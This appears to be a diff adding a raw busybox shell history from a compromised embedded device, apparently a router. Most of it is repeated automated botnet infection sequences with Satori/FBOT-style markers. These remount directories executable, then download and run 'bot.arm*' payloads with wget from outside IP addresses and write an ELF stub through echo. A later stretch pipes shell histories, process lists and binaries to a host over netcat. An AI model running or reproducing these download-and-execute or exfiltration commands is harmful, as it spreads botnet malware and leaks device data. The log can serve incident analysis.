@@ -1,0 +1,850 @@
+quit
+exit
+ls
+cd /
+ls
+cd .
+cd ..
+cd fh
+ls
+cd ..
+ls dev
+ls
+history
+cd home
+ls
+cd cli
+ls
+cd voip
+ls
+cd ..
+ls
+ls chip
+ls
+ls chip/security
+cat chip/security/ip_filter_get
+ls
+cd chip
+ls
+cd /
+ls
+cd var
+ls
+cat dhcp6s.conf
+quie
+exit
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+ls
+netstat
+ping
+help
+ls /usr/bin
+uname -a
+ls
+cd /bin
+ls
+ls | grep dd
+ls
+ps
+netstat
+fuser
+lsof
+netstat -tulpn | grep :80
+ps aux | grep webs
+whereis
+ls
+ls | grep web
+cd ..
+netstat | grep webs
+netstat
+netstat -tulpn
+ps aux | grep webs
+ps -auxwe | grep webs
+whatis webs
+history
+ls
+cd fh
+cd ../proc
+ls
+cd 1504
+ls
+pwd
+cd task
+ls
+cd 1504
+ls
+cat environ
+cd ../../
+ls
+cd ..
+ls
+cd ..
+ls
+cd home
+ls
+cd cli
+ls
+tree
+cd cfe
+ls
+cd ant
+ls
+cd ..
+ls
+cd hw
+ls
+cd ..
+ls
+cd ../../
+ls
+cd ../
+ls
+cd sbin
+ls
+cd ../bin
+ls
+man
+man webs
+find / -name "webs*"
+ps aux | grep .b
+ps aux | grep ".b"
+ps aux | grep \.b
+exit
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox FBOT
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox wget http://195.62.53.96/bot.armeb -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.armeb; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm4 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm4; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm5 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm5; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm6 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm6; >.b
+/bin/busybox wget http://195.62.53.96/bot.arm7 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.arm7; >.b
+/bin/busybox wget http://195.62.53.96/bot.aarch64 -O -> .b; /bin/busybox chmod 777 .b; ./.b scan.wget.aarch64; >.b
+/bin/busybox cp /bin/busybox .d && >.d && /bin/busybox chmod 777 .d && /bin/busybox cp /bin/busybox .b && >.b && /bin/busybox chmod 777 .b
+/bin/busybox echo -en '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x20\x83\x00\x00\x34\x00\x00\x00\xe4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > .d && /bin/busybox echo -en '\x45\x43\x48\x4f\x44\x4f\x4e\x45'
+enable
+system
+shell
+sh
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+enable
+system
+shell
+sh
+/bin/busybox DMSNA
+/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/; >/var/.file && cd /var/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /; >/.file && cd /
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /bin/; >/bin/.file && cd /bin/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /etc/; >/etc/.file && cd /etc/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox mkdir /sys/; >/sys/.file && cd /sys/
+/bin/busybox rm -rf .file .z .x
+/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA
+/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z
+/bin/busybox wget http://141.98.119.27:80/batkek/arm7 -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm7.wget; >.z
+fdisk -l
+exit
+ifconfig
+nc -h # me
+history | nc 192.168.1.18 9090
+history
+ls
+cd ~
+cat .bash_history | nc 192.168.1.18 9090
+ls -a
+cat .ash_history | nc 192.168.1.18 9090
+nc 192.168.1.18 9090 < /bin/busybox
+ps aux
+ps aux | nc 192.168.1.18 9090
+cat .ash_history | nc 192.168.1.18 9090
+netstat -tulpn | nc 192.168.1.18 9090
+ls
+nc 192.168.1.18 9090 < linuxrc
+cd etc
+ls
+cd rc.d
+ls
+cat rcS
+ls
+cat rc.shutdown
+cd ..
+ls
+cat inittab
+cd ..
+s
+ls
+cd o0l8aw3hke
+ls
+ls /bin | grep mime
+ls
+nc 192.168.1.18 9090 < o0l8aw3hke
+cd ..
+ls
+cd zy0t0jzxk5
+ls
+nc 192.168.1.18 9090 < zy0t0jzxk5
+cd ..
+ls
+ls include
+cd home
+ls
+cd cli
+ls
+cd ..
+ls
+cd /
+ls
+cd /
+tree | nc 192.168.1.18 9090
+cd /
+find . | sed -e "s/[^-][^\/]*\// |/g" -e "s/|\([^ ]\)/|-\1/" | nc 192.168.1.18 9090
+# gotta go
+exit
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
+sh
+shell
+enable
+system
+/bin/busybox SATORI
+mkdir /tmp; mount -o remount,rw,exec /tmp; >/tmp/.s && cd /tmp
+mkdir /var; mount -o remount,rw,exec /var; >/var/.s && cd /var
+mkdir /dev; mount -o remount,rw,exec /dev; >/dev/.s && cd /dev
+mkdir /mnt; mount -o remount,rw,exec /mnt; >/mnt/.s && cd /mnt
+mkdir /var/run; mount -o remount,rw,exec /var/run; >/var/run/.s && cd /var/run
+mkdir /var/tmp; mount -o remount,rw,exec /var/tmp; >/var/tmp/.s && cd /var/tmp
+mkdir /; mount -o remount,rw,exec /; >//.s && cd /
+mkdir /dev/netslink; mount -o remount,rw,exec /dev/netslink; >/dev/netslink/.s && cd /dev/netslink
+mkdir /dev/shm; mount -o remount,rw,exec /dev/shm; >/dev/shm/.s && cd /dev/shm
+mkdir /bin; mount -o remount,rw,exec /bin; >/bin/.s && cd /bin
+mkdir /etc; mount -o remount,rw,exec /etc; >/etc/.s && cd /etc
+mkdir /boot; mount -o remount,rw,exec /boot; >/boot/.s && cd /boot
+mkdir /usr; mount -o remount,rw,exec /usr; >/usr/.s && cd /usr
+mkdir /sys; mount -o remount,rw,exec /sys; >/sys/.s && cd /sys
